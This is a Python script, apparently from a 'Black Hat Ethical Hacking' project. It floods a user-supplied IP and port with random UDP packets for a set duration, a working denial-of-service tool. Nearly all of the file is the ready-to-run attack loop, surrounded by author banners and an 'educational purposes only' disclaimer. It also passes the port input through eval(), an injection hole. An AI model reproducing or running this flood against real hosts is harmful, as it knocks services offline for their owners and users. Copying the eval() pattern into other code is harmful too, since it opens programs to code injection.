import sys
import os
import time
import socket
import random
from termcolor import colored
from colorama import Fore
#This is where the magic starts using the power of python
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1337)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("figlet Black Hat Ethical Hacking")
print()
print(colored("Author   : SaintDruG", 'green'))
print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
print(colored("Facebook : https://www.facebook.com/secur1ty1samyth", 'green'))
print(colored("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
print(colored("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/", 'magenta'))
print(colored("Instagram : https://www.instagram.com/blackhatethicalhacking/", 'yellow'))
print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
print(colored("Security is a myth..   : Follow us & Stay Tuned!", 'magenta'))
print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
print()
ip = input("IP Target : ")
port = eval(input("Port       : "))
dur = input("Time: ")
timeout = time.time() + int(dur)
sent = 0
os.system("clear")
par="#"
os.system("figlet Attack Starting")
for i in range(0,100):
    print(Fore.RED+par,end="")
    time.sleep(0.01)
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(colored("Packets are being sent like crazy, check if the target is down... we sent %s packets to this Target: %s" % (
            sent, ip), 'green'))
    except KeyboardInterrupt:
        sys.exit()
